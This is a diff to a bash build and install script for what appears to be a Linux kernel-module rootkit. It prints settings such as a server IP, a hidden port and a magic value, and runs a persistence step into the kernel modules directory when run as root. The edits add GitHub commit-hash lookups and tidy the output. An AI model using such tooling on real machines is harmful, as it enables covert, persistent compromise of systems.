@@ -234,8 +234,13 @@ echo -e "${C}   │${D}                            github.com/MatheuZSecurity   
 echo -e "${C}   │${N}                                                                                            ${C}│${N}"
 echo -e "${C}   └────────────────────────────────────────────────────────────────────────────────────────────┘${N}"
 
+GITHUB_REV=$(curl -fs https://api.github.com/repos/MatheuZSecurity/Singularity/commits/main | grep -m1 '"sha"' | cut -d'"' -f4 | cut -c1-7)
+MY_VERSION=$(curl -fs https://api.github.com/repos/MatheuZSecurity/Singularity/commits/main | grep -m1 '"sha"' | cut -d'"' -f4 | cut -c1-7)
+
+
+
 section "MODULE INFORMATION"
-info "Module:  $NAME"
+info "Module:          $NAME"
 info "YOUR_SRV_IP:     $YOUR_SRV_IP"
 info "SRV_PORT:        $SRV_PORT"
 info "hidden port:     $PORT"
@@ -244,6 +249,9 @@ info "MAGIC:           $MAGIC"
 info "Distro:          $DISTRO"
 info "Distro Version:  $DISTRO_VERSION"
 info "Kernel:          $KVER"
+info "GITHUB Version:  $GITHUB_REV"
+info "CaaS Version     $MY_VERSION"
+
 section_end
 #info "Requesting build job..."
 get_memory_kb() {
@@ -465,7 +473,7 @@ if [ "$INSTALL" -eq 1 ] && [[ $EUID -eq 0 ]]; then
                 warn "Memory footprint: ${R}${mem_abs} MB (HIGH)${N}"
         fi
         section_end
-                if [ "$PERSIST" -eq 1 ] && [[ $EUID -eq 0 ]]; then
+                if [[ "$PERSIST" -eq 1 ]] && [[ $EUID -eq 0 ]]; then
 
                 section "PERSISTANCE"
                         MODULE_DIR="/usr/lib/modules/$(uname -r)/kernel"
